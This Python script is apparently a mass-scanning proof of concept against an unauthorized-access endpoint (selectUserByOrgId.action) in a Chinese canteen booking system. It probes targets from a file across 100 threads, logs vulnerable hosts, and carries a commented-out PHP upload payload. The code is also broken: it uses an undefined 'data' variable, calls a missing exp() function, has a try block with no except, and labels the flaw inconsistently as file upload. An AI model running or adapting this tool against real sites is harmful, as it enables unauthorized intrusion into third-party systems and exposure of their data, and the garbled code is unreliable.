import argparse,requests,sys,time,re


from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m'
RESET = '\033[0m'
def banner():
    text ='''                              
  __   __   __  ___   __  _  _   _ _   _ 
 / / _ \ \ /  \/ / | /  \| || | | | | | |
| |_/ \_| ( ()  <| || || ) || |_| | |_| |
 \___^___/ \__/\_\\_   _/ \_) ._,_|\___/ 
                    | |     | |          
                    |_|     |_|          wh
'''
    print(text)
def main():
    banner()
    parser=argparse.ArgumentParser(description="满客宝智慧食堂预定系统selectUserByOrgId未授权访问漏洞"


)
    parser.add_argument('-u','--url',dest='url',type=str,help="input your url"


)
    parser.add_argument('-f','--file',dest='file',type=str,help="input file path"


)
    args =parser.parse_args()
    #处理资产，添加线程



    if args.url and not args.file







:
        if poc(args.url):
           exp(args.url)
    elif not args.url and args.file






:
        url_list=[]
        with open('dh.txt','r',encoding='utf-8') as fp:








            for i in fp.readlines






():
                url_list.append(i.strip().replace('\n'



,''))
                # i = i.strip()
                # if 'https://' in i: #给资产自动添加http://






                #     url_list.append(i)
                # else:
                #     i = 'http://' + i
                #     url_list.append(i)
        mp =Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h"




)
def poc(target):
    url_payload= '/yuding/selectUserByOrgId.action?record='





    url = target + url_payload
    headers={
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36'





,
        'Connection': 'close',
            }
    #data ="--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"Test.php\"\r\n\r\n<?php phpinfo();?>\r\n--dd8f988919484abab3816881c55272a7\r\nContent-Disposition: form-data; name=\"Submit\"\r\n\r\nsubmit\r\n--dd8f988919484abab3816881c55272a7--\r\n\r\n\r\n"







    proxies={
        'http':'http://127.0.0.1:8080'







,
        'https':'http://127.0.0.1:8080'








    }
    try:
        response=requests.get(url=url,data=data,headers=headers,timeout=







5)
        match =re.search('"data":\s*{"id":\d+,"path":"([^"]+)"',response.text








)
        result = target + '/publishingImg/'+ match.group





(1)
        if response.status_code == 200:
            print(f"{GREEN}[+] {target} 存在文件上传注入漏洞！\n[+]访问：{result} {RESET




}")
            with open('loudong.txt','a',encoding='utf-8')as f:





                f.write(target + '\n')
                return True
        else:
            print("[-]不存在漏洞！！"



)
            return False

if __name__ == '__main__':
    main()
